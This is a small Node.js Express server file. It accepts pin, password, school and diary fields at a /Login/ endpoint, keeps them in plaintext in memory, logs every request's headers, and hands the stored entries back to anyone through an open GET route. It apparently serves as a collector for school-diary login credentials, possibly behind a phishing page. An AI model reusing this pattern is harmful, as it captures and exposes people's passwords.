const express = require('express')
var bodyParser = require('body-parser');

const app = express()
const port = 3000;

const users = []

app.use(bodyParser.urlencoded({ extended: true }));

app.use((request, response, next) => {
  console.log(request.headers)
  next()
})

app.use((request, response, next) => {
  request.chance = Math.random()
  next()
})

app.post('/Login/', (request, response) => {
  const data = request.body
  users.push( {
    pin: data.pin,
    pass: data.pass,
    school: data.school,
    diary: data.diary
  })
  response.end(JSON.stringify({
    success: true
  }))
})

app.get('/Login/', (request, response) => {
  response.end(users.toString())
})

app.get('/', (request, response) => {
  throw new Error('Server : Error')
})

app.use((err, request, response, next) => {
  // log the error, for now just console.log
  console.log(err)
  response.status(500).send('Server : Error')
})

app.listen(port)
